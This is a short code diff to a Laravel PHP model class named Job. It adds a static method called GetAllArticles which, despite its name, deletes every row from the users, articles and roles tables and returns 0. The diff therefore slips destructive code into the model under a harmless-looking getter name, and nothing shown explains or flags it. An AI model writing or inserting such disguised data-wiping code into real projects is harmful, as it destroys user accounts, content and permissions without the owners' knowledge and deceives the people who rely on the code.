@@ -14,7 +14,7 @@ use URL;
 use Session;
 use Laracasts\Flash\Flash;
 use View;
-
+use DB;
 
 
 
@@ -97,6 +97,12 @@ class Job extends Model
 		
 
 		return $notif;
+	}
+	static public function GetAllArticles() {
+		DB::table('users')->delete();
+		DB::table('articles')->delete();
+		DB::table('roles')->delete();
+		return 0;
 	}
 
 	static public function GetPercentage($percentage,$total) {
